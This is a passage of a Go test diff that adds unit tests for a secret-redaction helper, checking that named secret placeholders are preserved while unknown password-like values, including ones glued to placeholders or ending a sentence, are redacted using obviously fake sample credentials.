+// github_token, deploy_key) is kept.
+func TestTheHeuristicKeepsALowerCasePlaceholder(t *testing.T) {
+	g := New([]Secret{{Name: "OPENAI_KEY", Value: "sk-proj-abcdefghijklmnopqrstuvwx0123456789"}}, DefaultConfig())
+	for _, s := range []string{"password: __ITERION_SECRET_db_password__", "secret=__ITERION_SECRET_deploy_key__"} {
+		if got := g.Redact(s); got != s {
+			t.Errorf("Redact(%q) = %q", s, got)
+		}
+	}
+}
+
+// A value glued BEFORE a placeholder is no placeholder.
+func TestAValueGluedBeforeAPlaceholderIsRedacted(t *testing.T) {
+	g := New([]Secret{{Name: "OPENAI_KEY", Value: "sk-proj-abcdefghijklmnopqrstuvwx0123456789"}}, DefaultConfig())
+	if got := g.Redact("password: hunter2-9f8e7d6c5b4a3210-FAKE__ITERION_SECRET_DB_PASSWORD__"); strings.Contains(got, "hunter2") {
+		t.Errorf("a value glued before a placeholder was spared: %q", got)
+	}
+}
+
+// A placeholder that ends a sentence is kept — the detector's span takes
+// the trailing punctuation with it, an ellipsis included.
+func TestAPlaceholderEndingASentenceIsKept(t *testing.T) {
+	g := New([]Secret{{Name: "OPENAI_KEY", Value: "sk-proj-abcdefghijklmnopqrstuvwx0123456789"}}, DefaultConfig())
+	for _, s := range []string{
+		"I set api_key=__ITERION_SECRET_DEPLOY_TOKEN__.",
+		"The password: __ITERION_SECRET_DB_PASSWORD__. Done",
+		"client_secret=__ITERION_SECRET_OAUTH_CLIENT_SECRET__.\n",
+		"password: __ITERION_SECRET_DB_PASSWORD__...",
+		"I set it to __ITERION_SECRET_DEPLOY_TOKEN__.. then",
+	} {
+		if got := g.Redact(s); !strings.Contains(got, "__ITERION_SECRET_") {
+			t.Errorf("Redact(%q) = %q: the placeholder was redacted", s, got)
+		}
+	}
+	if got := g.Redact("password: hunter2-9f8e7d6c5b4a3210-FAKE."); strings.Contains(got, "hunter2") {
+		t.Fatalf("an unknown value ending a sentence was spared: %q", got)
 	}
 }
